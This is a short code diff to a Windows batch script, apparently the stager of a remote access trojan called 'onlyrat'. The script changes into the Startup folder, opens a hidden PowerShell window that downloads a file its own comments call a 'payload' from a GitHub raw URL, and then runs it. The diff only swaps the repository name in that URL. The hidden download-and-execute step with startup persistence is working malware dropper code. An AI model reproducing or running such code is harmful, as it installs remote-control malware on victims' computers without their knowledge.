@@ -11,7 +11,7 @@ cd %STARTUP%
 
 @REM TODO: build out stage two
 @REM write payload
-powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri raw.githubusercontent.com/WayneTheGod/TEST/main/onlyrat/files/wget.cmd  -OutFile wget.cmd"
+powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri raw.githubusercontent.com/WayneTheGod/test2/main/onlyrat/files/wget.cmd  -OutFile wget.cmd"
 
 @REM run payload 
 powershell ./wget.cmd 
